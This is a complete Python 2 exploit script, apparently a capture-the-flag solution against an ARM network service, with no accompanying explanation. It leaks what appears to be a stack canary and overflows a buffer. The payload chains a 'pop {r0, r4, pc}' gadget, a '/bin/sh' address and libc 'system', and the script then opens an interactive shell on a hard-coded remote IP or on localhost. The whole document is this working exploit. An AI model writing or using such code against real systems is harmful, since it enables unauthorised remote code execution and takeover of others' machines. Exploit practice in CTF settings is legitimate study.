import sys, socket, struct, telnetlib

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a):
    return struct.pack("<I",a)

def u(a):
    return struct.unpack("<I",a)[0]

def main():
    buf = "A"*41
    f.write(buf)
    read_until(f,buf)
    leak = u("\x00"+f.read(3))
    print hex(leak)
    
    buf = "C"*40
    buf += p(leak)
    buf += "A"*12
    buf += p(0x26b7c) # 26b7c:       e8bd8011        pop     {r0, r4, pc}
    buf += p(0x71eb0) # /bin/sh
    buf += "A"*4
    buf += p(0x016d90) #00016d90 <__libc_system>:
    read_until(f,">")
    f.write(buf)
    read_until(f,">")
    f.write("\n")
    shell(s)

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("116.203.30.62", 18113)
        main()
    else:
        s, f = sock("localhost", 18113)
        main()
